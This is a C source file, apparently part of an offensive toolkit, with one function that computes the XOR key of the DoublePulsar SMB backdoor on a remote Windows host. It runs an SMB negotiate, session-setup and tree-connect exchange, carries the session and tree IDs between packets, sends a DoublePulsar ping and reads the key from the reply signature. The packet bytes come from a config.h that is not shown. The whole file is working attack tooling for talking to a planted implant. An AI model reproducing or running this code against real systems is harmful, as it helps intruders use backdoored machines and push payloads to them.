#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    const uint8_t *packet_sources[4];
    size_t packet_sizes[4];
    uint8_t *packets[4] = { NULL, NULL, NULL, NULL };
    SOCKET sock = INVALID_SOCKET;
    unsigned int result = 0;
    uint8_t user_id[2];
    uint8_t tree_id[2];
    int success = 0;

    if (ip == NULL)
        goto cleanup;

    packet_sources[0] = SMB_NEGOTIATE_PKT;
    packet_sizes[0] = sizeof(SMB_NEGOTIATE_PKT);
    packet_sources[1] = SMB_SESSION_SETUP_PKT;
    packet_sizes[1] = sizeof(SMB_SESSION_SETUP_PKT);
    packet_sources[2] = SMB_TREE_CONNECT_PKT;
    packet_sizes[2] = sizeof(SMB_TREE_CONNECT_PKT);
    packet_sources[3] = DP_PING_PKT;
    packet_sizes[3] = sizeof(DP_PING_PKT);

    for (size_t i = 0; i < 4; ++i) {
        if (packet_sizes[i] < 1)
            goto cleanup;
        packets[i] = (uint8_t *)malloc(packet_sizes[i]);
        if (packets[i] == NULL)
            goto cleanup;
        memcpy(packets[i], packet_sources[i], packet_sizes[i]);
    }

    if (packet_sizes[2] < 34 || packet_sizes[3] < 34)
        goto cleanup;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        goto cleanup;

    for (int stage = 0; stage < 4; ++stage) {
        size_t send_length = packet_sizes[stage] - 1;
        size_t sent = 0;
        uint8_t header[4];
        size_t header_received = 0;
        uint32_t payload_length;
        size_t response_length;
        uint8_t *response = NULL;
        size_t received;

        while (sent < send_length) {
            size_t remaining = send_length - sent;
            int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
            int n = send(sock, (const char *)packets[stage] + sent, chunk, 0);
            if (n == SOCKET_ERROR || n == 0)
                goto cleanup;
            sent += (size_t)n;
        }

        while (header_received < sizeof(header)) {
            int n = recv(sock, (char *)header + header_received,
                         (int)(sizeof(header) - header_received), 0);
            if (n == SOCKET_ERROR || n == 0)
                goto cleanup;
            header_received += (size_t)n;
        }

        if (header[0] != 0)
            goto cleanup;

        payload_length = ((uint32_t)(header[1] & 0x01) << 16) |
                         ((uint32_t)header[2] << 8) |
                         (uint32_t)header[3];
        response_length = (size_t)payload_length + sizeof(header);
        response = (uint8_t *)malloc(response_length);
        if (response == NULL)
            goto cleanup;
        memcpy(response, header, sizeof(header));

        received = sizeof(header);
        while (received < response_length) {
            size_t remaining = response_length - received;
            int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
            int n = recv(sock, (char *)response + received, chunk, 0);
            if (n == SOCKET_ERROR || n == 0) {
                free(response);
                goto cleanup;
            }
            received += (size_t)n;
        }

        if (stage == 1) {
            if (response_length < 34) {
                free(response);
                goto cleanup;
            }
            user_id[0] = response[32];
            user_id[1] = response[33];
            packets[2][32] = user_id[0];
            packets[2][33] = user_id[1];
        } else if (stage == 2) {
            if (response_length < 34) {
                free(response);
                goto cleanup;
            }
            tree_id[0] = response[28];
            tree_id[1] = response[29];
            user_id[0] = response[32];
            user_id[1] = response[33];
            packets[3][28] = tree_id[0];
            packets[3][29] = tree_id[1];
            packets[3][32] = user_id[0];
            packets[3][33] = user_id[1];
        } else if (stage == 3) {
            if (SMB_RESP_SIGNATURE_END < SMB_RESP_SIGNATURE_START ||
                SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START != 4 ||
                (size_t)SMB_RESP_SIGNATURE_END > response_length) {
                free(response);
                goto cleanup;
            }
            result = (unsigned int)response[SMB_RESP_SIGNATURE_START] |
                     ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
                     ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
                     ((unsigned int)response[SMB_RESP_SIGNATURE_START + 3] << 24);
            success = 1;
        }

        free(response);
    }

cleanup:
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    for (size_t i = 0; i < 4; ++i)
        free(packets[i]);
    return success ? result : 0;
}